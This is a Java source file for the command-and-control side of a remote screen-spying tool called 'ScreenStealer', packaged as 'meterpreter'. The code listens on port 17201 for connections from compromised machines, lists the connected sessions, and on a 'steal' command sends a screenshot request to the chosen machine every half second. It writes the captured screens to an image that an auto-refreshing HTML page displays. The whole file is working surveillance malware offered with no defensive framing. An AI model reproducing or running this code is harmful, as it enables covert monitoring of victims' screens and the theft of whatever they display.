package com.meterpreter;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

abstract class pRes {

	public static final String IMG_NAME = "live.jpg";
	public static final String HTML_NAME = "live.html";
	public static final int INTERVAL = 500;

	public static List<Session> sessionList;

	public static ServerSocket serverSocket;
	public static final int LISTEN_PORT = 17201;
}

abstract class Cmd {

	public static final String TAKE_SCREEN_SHOT = "TSS";
}

class Commander {

	private BufferedReader br;
	private Thread commandThread;

	private static class Singleton {
		static Commander INSTANCE = new Commander();
	}

	public static Commander getInstance() {
		return Singleton.INSTANCE;
	}

	public Commander() {
		br = new BufferedReader(new InputStreamReader(System.in));
		try {
			File img = new File(pRes.IMG_NAME);
			if(!img.exists())
				img.createNewFile();
			
			File file = new File(pRes.HTML_NAME);
			if(!file.exists())
				file.createNewFile();
			FileOutputStream fos = new FileOutputStream(pRes.HTML_NAME);
			String html = 
					"<!DOCTYPE html>\n" + 
					"<html>\n" + 
					"<head>\n" + 
					"	<meta http-equiv=\"refresh\" content=\"0.5\">\n" + 
					"	<title>	Live view</title>\n" + 
					"</head>\n" + 
					"<body>\n" + 
					"<img src=\"file://" + 
					img.getAbsolutePath() + 
					"\">" +
					"</body>\n" + 
					"</html>\n" + 
					"";
			fos.write(html.getBytes());
			fos.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void command(DataOutputStream dos) {

		System.out.println("Press 'e' to interrupt stealing.\n");
		commandThread = new Thread(() -> {
			while (true) {
				try {
					dos.writeUTF(Cmd.TAKE_SCREEN_SHOT);
					Thread.sleep(pRes.INTERVAL);
				} catch (Exception e) {
					System.out.println("Stealing was interrupted.");
					System.out.print("\nscreenstealer > ");
					break;
				}
			}
		});
		commandThread.start();
		
		while (true) {
			try {
				String input = br.readLine();
				if (input.equals("e"))
					break;

				System.out.println("\nPress 'e' to end stealing.");
			} catch (Exception e) {
				e.printStackTrace();
				break;
			}
		}
		commandThread.interrupt();
	}
}

class Receiver {

	private ObjectInputStream ois;

	public Receiver(ObjectInputStream ois) {
		this.ois = ois;
	}

	public void update() throws Exception {
		byte[] capturedImage = getScreenCaptureByteArray();
		if (capturedImage == null)
			throw new Exception("Session closed");

		FileOutputStream fos = new FileOutputStream(pRes.IMG_NAME);
		fos.write(capturedImage);
		fos.close();

		return;
	}

	private byte[] getScreenCaptureByteArray() {
		try {
			return (byte[]) ois.readObject();
		} catch (Exception e) {
			return null;
		}
	}
}

class Session implements Runnable {

	private String ip;
	private DataOutputStream dos;
	private ObjectInputStream ois;

	public Session(Socket sessionSocket) {
		if (!getStream(sessionSocket))
			return;
	}

	private boolean getStream(Socket sessionSocket) {
		try {
			dos = new DataOutputStream(sessionSocket.getOutputStream());
			ois = new ObjectInputStream(sessionSocket.getInputStream());
			ip = sessionSocket.getInetAddress().getHostAddress();
			System.out.println("\nNew Session connected : " + ip);
			System.out.print("\nscreenstealer > ");

			synchronized (pRes.sessionList) {
				pRes.sessionList.add(this);
			}
			return true;
		} catch (Exception e) {
			System.out.println("Failed to get stream.");
			return false;
		}
	}

	@Override
	public void run() {
		Receiver receiver = new Receiver(ois);

		while (true) {
			try {
				receiver.update();
			} catch (Exception sessionClosed) {
				System.out.println("Session lost : " + ip);
				System.out.print("\nscreenstealer > ");

				synchronized (pRes.sessionList) {
					pRes.sessionList.remove(this);
				}
				return;
			}
		}
	}

	public String getIp() {
		return ip;
	}

	public DataOutputStream getDos() {
		return dos;
	}
}

class IO {

	private BufferedReader br;

	public IO() {
		br = new BufferedReader(new InputStreamReader(System.in));
	}

	public void mainIO() {
		String logo =""
				+ "  ____                           ____  _             _           \n" + 
				" / ___|  ___ _ __ ___  ___ _ __ / ___|| |_ ___  __ _| | ___ _ __ \n" + 
				" \\___ \\ / __| '__/ _ \\/ _ \\ '_ \\\\___ \\| __/ _ \\/ _` | |/ _ \\ '__|\n" + 
				"  ___) | (__| | |  __/  __/ | | |___) | ||  __/ (_| | |  __/ |   \n" + 
				" |____/ \\___|_|  \\___|\\___|_| |_|____/ \\__\\___|\\__,_|_|\\___|_|   \n" + 
				"  ____          ___                                              \n" + 
				" | __ ) _   _  |_ _|_ __  ______ _ _ __  _ __                    \n" + 
				" |  _ \\| | | |  | || '_ \\|_  / _` | '_ \\| '_ \\                   \n" + 
				" | |_) | |_| |  | || | | |/ / (_| | |_) | |_) |                  \n" + 
				" |____/ \\__, | |___|_| |_/___\\__,_| .__/| .__/                   \n" + 
				"        |___/                     |_|   |_|                      ";
		
		System.out.println(logo);

		String cmd = null;
		while (true) {
			System.out.print("\nscreenstealer > ");
			try {
				cmd = br.readLine();
			} catch (Exception e) {
				e.printStackTrace();
			}

			String[] isolated = cmd.split(" ");

			int sessionIdx = -1;
			if (isolated.length == 1) {
				switch (isolated[0]) {
				case "sessions":
					if (pRes.sessionList.size() == 0) {
						System.out.println("No session was connedted.");
						break;
					}
					System.out.println();
					System.out.println("No          IP");
					System.out.println("-----------------------");
					for (int i = 0; i < pRes.sessionList.size(); ++i)
						System.out.println(i + 1 + "        " + pRes.sessionList.get(i).getIp());
					break;

				case "exit":
				case "quit":
					System.exit(0);

				default:
					invalidCommand();
					break;
				}
			} else if (isolated.length == 2 && isolated[0].equals("steal")) {
				try {
					sessionIdx = Integer.parseInt(isolated[1]);
				} catch (Exception e) {
					invalidCommand();
					continue;
				}
				if (pRes.sessionList.size() < sessionIdx || sessionIdx <= 0) {
					System.out.println("There is no session " + sessionIdx);
					continue;
				}
				Session session = pRes.sessionList.get(sessionIdx - 1);
				Commander.getInstance().command(session.getDos());
			} else
				invalidCommand();

		}
	}

	private void invalidCommand() {
		System.out.println("Invalid command.");
		System.out.println("Use 'sessions' or 'steal n', n = session number.");
	}
}

public class Meterpreter {

	public static void main(String[] args) {
		Meterpreter meterpreter = new Meterpreter();
		meterpreter.activate();
	}

	public void activate() {
		if (!initServer())
			return;

		acceptClient();
		new IO().mainIO();
	}

	private boolean initServer() {
		try {
			pRes.serverSocket = new ServerSocket(pRes.LISTEN_PORT);
			pRes.sessionList = Collections.synchronizedList(new ArrayList<>());
			return true;
		} catch (IOException e) {
			System.out.println("Port " + pRes.LISTEN_PORT + " is already used.");
			return false;
		}
	}

	private void acceptClient() {
		new Thread(() -> {
			while (true) {
				try {
					Socket sessionSocket = pRes.serverSocket.accept();
					new Thread(new Session(sessionSocket)).start();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
}